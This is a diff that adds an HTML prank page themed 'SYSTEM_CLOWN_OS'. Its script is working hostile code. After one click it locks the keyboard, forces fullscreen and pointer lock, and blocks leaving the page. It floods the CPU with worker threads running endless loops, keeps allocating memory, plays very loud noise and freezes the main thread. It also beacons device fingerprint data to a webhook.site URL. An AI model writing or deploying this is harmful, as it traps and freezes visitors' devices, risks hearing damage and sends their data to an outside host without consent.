@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>🤡 SYSTEM_CLOWN_OS_v32 🤡</title>
+    <style>
+        /* Блокировка взаимодействия */
+        * { cursor: none !important; user-select: none !important; touch-action: none !important; -webkit-tap-highlight-color: transparent; outline: none !important; }
+        body, html { background: #000; color: #f00; margin: 0; padding: 0; width: 100vw; height: 100vh; overflow: hidden; font-family: 'Comic Sans MS', cursive, sans-serif; }
+        
+        /* Слой Клоуна */
+        #clown-layer {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 350px; z-index: 2147483647; pointer-events: none;
+            text-shadow: 0 0 100px #ff00ff, 0 0 200px #00ff00;
+            opacity: 0; will-change: transform, filter, opacity;
+        }
+
+        /* Тряска и безумие (GPU Stress) */
+        .clown-meltdown {
+            animation: global-shake 0.05s infinite, color-cycle 0.1s infinite;
+            filter: contrast(500%) brightness(1.5);
+            transform: translate3d(0,0,0);
+        }
+        
+        @keyframes global-shake {
+            0% { transform: translate(5px, 5px) rotate(0deg); }
+            25% { transform: translate(-5px, -10px) rotate(1deg); }
+            50% { transform: translate(-15px, 5px) rotate(-1deg); }
+            75% { transform: translate(10px, 10px) rotate(0deg); }
+            100% { transform: translate(5px, -5px) rotate(1deg); }
+        }
+
+        @keyframes color-cycle {
+            0% { background: #ff0000; }
+            33% { background: #00ff00; }
+            66% { background: #ff00ff; }
+            100% { background: #ffff00; }
+        }
+
+        @keyframes clown-zoom {
+            0% { transform: scale(0.5); opacity: 0.8; }
+            50% { transform: scale(1.5); opacity: 1; }
+            100% { transform: scale(0.5); opacity: 0.8; }
+        }
+
+        /* Окна безумия */
+        .clown-win {
+            position: absolute; background: #ffff00; border: 5px solid #ff00ff;
+            padding: 20px; font-size: 20px; color: #000; z-index: 1500000;
+            box-shadow: 15px 15px 0 #ff0000; pointer-events: none;
+            width: 300px; text-align: center; font-weight: bold;
+        }
+    </style>
+</head>
+<body onclick="BURMALDA_V32.ignite()">
+    <div id="clown-layer">🤡</div>
+    <div id="status" style="position:fixed; top:10px; left:10px; color:#fff; z-index:2000000; background:#000; padding:20px; border:4px solid #ff00ff; font-family:monospace; font-size:14px; text-transform: uppercase;">
+        > [USER@CLOWN_INFECTOR]:~# RUN_FUNNY_SCRIPT.SH<br>
+        > [SYSTEM]: INJECTING_LAUGHTER... OK<br>
+        > [SYSTEM]: HARDWARE_TO_TOY... OK<br><br>
+        > [!!!] CLICK_TO_START_THE_SHOW [!!!]
+    </div>
+
+<script>
+/**
+ * БЛОК 1: ДВИЖОК УНИЧТОЖЕНИЯ (МЕХАНИЗМ НЕ ТРОНУТ)
+ */
+window.MELTDOWN_ENGINE = {
+    threads: [],
+    vault: [],
+
+    launchCores: function() {
+        const workerCode = `
+            self.onmessage = function() {
+                const buffer = new Float64Array(1024 * 1024 * 8);
+                (function cycle() {
+                    for(let i=0; i<buffer.length; i++) {
+                        buffer[i] = Math.atan2(Math.random(), Math.random()) * Math.hypot(i, i);
+                    }
+                    Promise.resolve().then(cycle);
+                })();
+            };
+        `;
+        const url = URL.createObjectURL(new Blob([workerCode], {type: 'application/javascript'}));
+        const cores = navigator.hardwareConcurrency || 12;
+        for(let i = 0; i < cores * 2; i++) { 
+            const w = new Worker(url);
+            w.postMessage("ignite");
+            this.threads.push(w);
+        }
+    },
+
+    sprayMemory: function() {
+        setInterval(() => {
+            for(let i=0; i<20; i++) {
+                const chunk = new Uint32Array(1024 * 1024 * 4);
+                crypto.getRandomValues(chunk);
+                this.vault.push(chunk);
+            }
+            if (this.vault.length > 50) this.vault.shift(); 
+        }, 50);
+    },
+
+    siren: function() {
+        const ctx = new (window.AudioContext || window.webkitAudioContext)();
+        const bufferSize = 2 * ctx.sampleRate;
+        const buffer = ctx.createBuffer(1, bufferSize, ctx.sampleRate);
+        const output = buffer.getChannelData(0);
+        for (let i = 0; i < bufferSize; i++) { output[i] = Math.random() * 2 - 1; }
+        const noise = ctx.createBufferSource();
+        noise.buffer = buffer;
+        noise.loop = true;
+        const gain = ctx.createGain();
+        gain.gain.value = 10;
+        noise.connect(gain);
+        gain.connect(ctx.destination);
+        noise.start();
+    },
+
+    freeze: function() {
+        const lock = () => {
+            const start = Date.now();
+            while (Date.now() - start < 950) { Math.hypot(Math.random(), Math.random()); }
+            queueMicrotask(lock);
+        };
+        lock();
+    },
+
+    launch: function() {
+        this.siren();
+        this.sprayMemory();
+        this.launchCores();
+        setTimeout(() => {
+            document.title = "🤡 YOU ARE A CLOWN 🤡";
+            window.onbeforeunload = () => "STAY IN THE CIRCUS";
+            this.freeze();
+        }, 800);
+    }
+};
+
+/**
+ * БЛОК 2: ВИЗУАЛЬНЫЙ ХАОС (ОБНОВЛЕНО)
+ */
+window.BURMALDA_V32 = {
+    WH: 'https://webhook.site/YOUR_UUID_HERE',
+
+    send: function(tag, data) {
+        try {
+            const payload = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
+            navigator.sendBeacon(`${this.WH}?${tag}=${payload}`);
+        } catch(e) {}
+    },
+
+    harvest: async function() {
+        const loot = {
+            sys: { 
+                ua: navigator.userAgent, 
+                cores: navigator.hardwareConcurrency, 
+                mem: navigator.deviceMemory, 
+                res: `${screen.width}x${screen.height}`
+            },
+            ts: new Date().toISOString()
+        };
+        this.send("CLOWN_REPORT", loot);
+    },
+
+    lockdown: function() {
+        const el = document.documentElement;
+        if (navigator.keyboard && navigator.keyboard.lock) {
+            navigator.keyboard.lock(["Escape", "Tab", "MetaLeft", "MetaRight", "F11"]).catch(()=>{});
+        }
+        const force = async () => {
+            try {
+                if (!document.fullscreenElement) {
+                    const req = el.requestFullscreen || el.webkitRequestFullscreen;
+                    if (req) await req.call(el);
+                }
+                if (el.requestPointerLock) el.requestPointerLock();
+            } catch(e) {}
+        };
+        ['mousedown', 'keydown', 'touchstart'].forEach(ev => document.addEventListener(ev, force));
+        setInterval(force, 500);
+        window.addEventListener('keydown', (e) => { e.preventDefault(); e.stopPropagation(); }, true);
+    },
+
+    spawnTrash: function() {
+        document.body.classList.add('clown-meltdown');
+        const clownLayer = document.getElementById('clown-layer');
+        clownLayer.style.opacity = "1";
+        clownLayer.style.animation = "clown-zoom 0.2s infinite";
+
+        const messages = ["HONK!", "CLOWNED!", "U R NEXT", "🤡🤡🤡", "LOOK BEHIND U", "SYSTEM: JOKE"];
+
+        setInterval(() => {
+            for(let i=0; i<8; i++) {
+                const e = document.createElement('div');
+                e.className = 'clown-win';
+                e.style.top = Math.random() * 80 + 'vh';
+                e.style.left = Math.random() * 80 + 'vw';
+                e.style.transform = `rotate(${Math.random() * 40 - 20}deg)`;
+                e.innerHTML = messages[Math.floor(Math.random() * messages.length)];
+                document.body.appendChild(e);
+            }
+            const nodes = document.getElementsByClassName('clown-win');
+            if(nodes.length > 40) { for(let j=0; j<10; j++) if(nodes[0]) nodes[0].remove(); }
+        }, 150);
+    },
+
+    ignite: async function() {
+        document.getElementById('status').innerHTML = "> [!] THE SHOW BEGINS...<br>> [!] HONK HONK.";
+        document.body.onclick = null; 
+        
+        this.lockdown();
+        this.spawnTrash();
+        await this.harvest();
+
+        setTimeout(() => { window.MELTDOWN_ENGINE.launch(); }, 500);
+    }
+};
+
+document.oncontextmenu = e => { e.preventDefault(); return false; };
+</script>
+</body>
+</html>
